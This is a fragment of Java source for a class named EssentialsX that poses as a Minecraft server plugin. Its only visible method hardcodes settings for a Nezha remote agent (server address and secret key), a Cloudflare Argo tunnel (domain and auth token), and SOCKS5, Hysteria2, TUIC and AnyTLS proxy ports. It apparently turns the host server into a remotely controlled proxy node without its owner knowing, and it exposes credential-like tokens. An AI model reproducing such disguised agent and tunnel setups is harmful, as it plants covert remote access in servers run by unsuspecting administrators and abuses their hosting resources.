...
public class EssentialsX extends JavaPlugin {
    ...
    private void applyDefaultEnv(Map<String, String> env) {
        env.put("UUID", "4f137fee-262f-43eb-ab14-2dc04d9c7136");
        env.put("FILE_PATH", "./world");
        env.put("NEZHA_SERVER", "nzmbv.wuge.nyc.mn:443");
        env.put("NEZHA_PORT", "");
        env.put("NEZHA_KEY", "gUxNJhaKJgceIgeapZG4956rmKFgmQgP");
        env.put("ARGO_PORT", "8001");
        env.put("ARGO_DOMAIN", "cloudblaze.wuge.nyc.mn");
        env.put("ARGO_AUTH", "eyJhIjoiNzU0MTM1NWEwYThlODY5Yzc3MWI2ZTEzODViODgyMmMiLCJ0IjoiYWM1YzViMjUtZTU1NS00YTNkLTk3NjAtOGFkNTdlMTQyNjlhIiwicyI6Ik9EbGhZMk0yWWpNdE9UVTBOQzAwWmpFM0xUa3hNVEF0WW1JNU56WmpZVFEzWm1FMSJ9");
        env.put("S5_PORT", "");
        env.put("HY2_PORT", "");
        env.put("TUIC_PORT", "");
        env.put("ANYTLS_PORT", "");
